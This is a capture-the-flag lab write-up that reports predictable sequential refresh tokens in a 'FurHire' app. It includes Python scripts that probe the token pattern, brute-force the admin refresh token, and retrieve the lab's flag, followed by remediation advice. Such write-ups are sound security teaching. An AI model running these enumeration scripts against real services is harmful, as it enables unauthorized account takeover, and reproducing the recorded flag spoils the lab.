# Bug Report - furhire-009: Predictable Sequential Refresh Token Allows Admin Account Takeover

**Lab:** furhire-009  
**Difficulty:** Medium  
**Date:** 2026-06-26  
**Severity:** Critical  
**CWE:** CWE-340 (Generation of Predictable Numbers or Identifiers)  
**CVSS:** 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) - unauthenticated, no user interaction, full admin compromise

---

## Summary

The FurHire application generates refresh tokens using a fixed 30-character prefix concatenated with a 2-character alphabetic suffix that increments globally across all users. By registering two consecutive accounts, an attacker can observe the sequential pattern and enumerate all 676 possible suffix values (`aa` through `zz`) against the `POST /api/refresh` endpoint using the username "admin". The valid admin token is found and exchanged for an admin-signed JWT, which is then used to retrieve the flag from `GET /api/admin/flag`.

---

## Steps to Reproduce

**Step 1 - Identify the refresh token pattern**

Register two accounts and inspect the `Set-Cookie` response header:

```python
import urllib.request, json

target = "https://lab-1782473380684-7ovef8.labs-app.bugforge.io"

for i in range(3):
    req = urllib.request.Request(target + "/api/register",
        data=json.dumps({"username": f"probe{i}", "email": f"p{i}@test.com",
                         "password": "Password123!", "role": "user"}).encode(),
        headers={"Content-Type": "application/json"}, method="POST")
    resp = urllib.request.urlopen(req)
    for k, v in resp.headers.items():
        if k.lower() == "set-cookie" and "refresh_token" in v:
            print(v.split(";")[0])
```

Output:
```
refresh_token=dvqsngijwsbsuaihxytgusyrjjggjrax
refresh_token=dvqsngijwsbsuaihxytgusyrjjggjray
refresh_token=dvqsngijwsbsuaihxytgusyrjjggjraz
```

The token is a fixed 30-character prefix (`dvqsngijwsbsuaihxytgusyrjjggjr`) followed by a 2-character suffix that increments alphabetically: `ax` -> `ay` -> `az` -> `ba` -> etc. This gives 676 total combinations.

**Step 2 - Brute-force the admin refresh token**

```python
import urllib.request, json, string
from itertools import product

PREFIX = "dvqsngijwsbsuaihxytgusyrjjggjr"
target = "https://lab-1782473380684-7ovef8.labs-app.bugforge.io"

admin_token = None
for suffix in [''.join(p) for p in product(string.ascii_lowercase, repeat=2)]:
    req = urllib.request.Request(target + "/api/refresh",
        data=json.dumps({"username": "admin"}).encode(),
        headers={
            "Content-Type": "application/json",
            "Cookie": f"refresh_token={PREFIX}{suffix}"
        }, method="POST")
    try:
        resp = urllib.request.urlopen(req)
        data = json.loads(resp.read())
        if data.get("token"):
            admin_token = data["token"]
            print(f"Found admin token! suffix={suffix}")
            break
    except urllib.error.HTTPError:
        pass  # invalid token
```

Token found at suffix `aw` after 23 attempts.

**Step 3 - Retrieve the flag**

```python
req = urllib.request.Request(target + "/api/admin/flag",
    headers={"Authorization": f"Bearer {admin_token}"})
resp = urllib.request.urlopen(req)
print(json.loads(resp.read()))
```

Response:
```json
{"flag": "bug{S6LqJfFYQdoKZrakVllpwBFrccyvj1Vp}"}
```

The decoded JWT payload confirms full admin access: `{"id": 1, "username": "admin", "role": "admin"}`.

---

## Impact

- Full unauthenticated admin account takeover in at most 676 HTTP requests
- No prior knowledge of the admin password required
- The refresh endpoint has no rate limiting, allowing the brute force to complete in seconds
- An attacker gains a valid admin-signed JWT, providing access to any admin-restricted endpoint
- The token space is globally shared - the same technique works against any registered user by substituting their username

---

## Root Cause

The refresh token generation function uses a single server-wide counter seeded at startup and increments it with each token issuance. The counter value is encoded as a 2-character base-26 alphabetic suffix appended to a fixed prefix. Because the counter is shared across all users and sessions, tokens from different users occupy adjacent counter values. With a total search space of 26^2 = 676, the valid window for any active session is exhaustible in milliseconds with no authentication required on the brute-force endpoint itself.

---

## Remediation

1. Replace the counter-based token generator with `crypto.randomBytes(32).toString('hex')` or equivalent - minimum 128 bits of entropy
2. Implement exponential backoff and account lockout on the `/api/refresh` endpoint after repeated failures from the same IP
3. Scope refresh tokens to specific users server-side - validate that the token was issued to the presented username before exchanging it
4. Rotate the fixed prefix, which is also effectively a static secret embedded in every issued token

---

## Flag

`bug{S6LqJfFYQdoKZrakVllpwBFrccyvj1Vp}`
